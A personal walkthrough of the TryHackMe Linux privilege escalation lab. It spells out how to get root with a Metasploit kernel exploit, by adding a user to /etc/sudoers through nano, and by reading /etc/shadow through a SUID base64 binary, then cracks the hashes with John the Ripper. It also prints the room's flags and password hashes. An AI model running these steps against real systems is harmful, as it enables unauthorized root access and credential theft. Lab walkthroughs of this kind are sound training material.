# [Linux Privilege Escalation - TryHackMe](https://tryhackme.com/room/linprivesc) | Cya-nyde

Learn the fundamentals of Linux privilege escalation. From enumeration to exploitation, get hands-on with over 8 different privilege escalation techniques.

## Credits

- Room created by [tryhackme](https://tryhackme.com/p/tryhackme) and [1337rce](https://tryhackme.com/p/1337rce)
- Room type: Free

## Enumeration

**Low-priv credentials for box:**

- Username: karen
- Password: Password1

### What is the hostname of the target system?

> `uname -a` returns us <code>Linux **wade7363** 3.13.0-24-generic #46-Ubuntu SMP Thu Apr 10 19:11:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux</code>

### What is the Linux kernel version of the target system?

> Our `uname -a` command also gave us **Linux 3.13.0-24-generic**

### What Linux is this?

> `cat /etc/issue` to see <code>**Ubuntu 14.04** LTS \n \l</code>

### What version of Python language is installed on the system?

> `python --version` returns **Python 2.7.6**

### What vulnerability seem to affect the kernel of the target system?

> A quick google search of our kernel version *Linux 3.13.0* give us **CVE-2015-1328**

## Kernel Exploits

- `msfconsole` to open MetaSploit and `use scanner/ssh/ssh_login`
- Set all options appropriately including the provided credentials
- `exploit` the target and it should give you a backgrounded SSH session
- `search CVE-2015-1328` to find the module for our kernel exploit
- Set options appropriately - **be sure to use your VPN IP** for LOCALHOST
- `exploit` target to get root on the system

### What is the content of the flag1.txt file?

- Use `locate flag1.txt` to find the flag

> <details><summary><code>cat /home/matt/flag1.txt</code> gives us </summary>THM-28392872729920</details>

## Sudo

### How many programs can the user "karen" run on the target system with sudo rights?

> `sudo -l` gives us **3** binaries that the user *karen* is allowed to run as sudo on the machine

- /usr/bin/find
- /usr/bin/less
- /usr/bin/nano

### What is the content of the flag2.txt file?

- Use GTFObins on each of these binaries to try and escalate privileges
    - Try nano first, since it lets you directly edit text
    - Let's see if we can use nano to add ourselves as a sudoer
    - Since we have sudo access to nano, we can `sudo nano /etc/sudoers` and add the line `karen ALL=(ALL:ALL) ALL` to give ourselves root access on the machine
- After gaining root, `find / -name flag2.txt` shows us where flag2 is located

> <details><summary><code>cat /home/ubuntu/flag2.txt</code> to get </summary>THM-402028394</details>

### How would you use Nmap to spawn a root shell if your user had sudo rights on nmap?

GTFObins has a one-liner that allows you to run commands in nmap as sudo (if you have rights to run the script as sudo):

> `sudo namp --interactive`

### What is the hash of frank's password?

- As root, we can `cat /etc/shadow` to show us the password hashes of every user

> Frank's hash is: `$6$2.sUUDsOLIpXKxcr$eImtgFExyr2ls4jsghdD3DHLHHP9X50Iv.jNmwo/BJpphrPRJWjelWEz2HH.joV14aDEwW1c3CahzB1uaqeLR1`

## SUID

### Which user shares the name of a great comic book writer?

- The user karen is allowed to cat `/etc/passwd`, showing a list of users

> The user that immediately stands out is **gerryconway**.

### What is the password of user2?

- Used `find / -type f -perm -04000 -ls 2>/dev/null`, to get a list of binaries with SUID bits set
- Out of the ones listed, many are stored in the /snap directory, which will likely not be useful
    - `/usr/bin/base64` is the only binary that has a SUID bit set and is not in a snap directory that has a listing in GTFOBins for an SUID bit
- Used base64 to encode then decode /etc/shadow
    - `base64 /etc/shadow | base64 --decode`
    - We get this password hash for user2: `$6$m6VmzKTbzCD/.I10$cKOvZZ8/rsYwHd.pE099ZRwM686p/Ep13h7pFMBCG4t7IukRqc/fXlA1gHXh9F2CbwmD4Epi1Wgh.Cl.VV1mb/`
- To use `unshadow`, we need both *passwd* and *shadow*
    - `unshadow` does not exist on target machine, and no sudo permissions to install
    - We need to get `/etc/passwd` and `/etc/shadow` to our attack machine
        - We can copy the contents of each after using `cat` and/or our base64 SUID exploit and `echo` them into files on our attack machine
            - `echo '*/etc/passwd contents*' > passwd`
            - `echo '*/etc/shadow contents*' > shadow`
    - `unshadow passwd shadow > hash.txt` to output the hashes into *hash.txt*
- *hash.txt* can now be cracked by **johntheripper**
- `john hash.txt --wordlist=*path-to-wordlist*` (rockyou.txt worked for me)

> The cracked password we find is **Password1**

### What is the content of the flag3.txt file?

- `cd /home/ubuntu`
- `base64 flag3.txt | base64 --decode`

> <details><summary>The flag found is </summary>THM-3847834</details>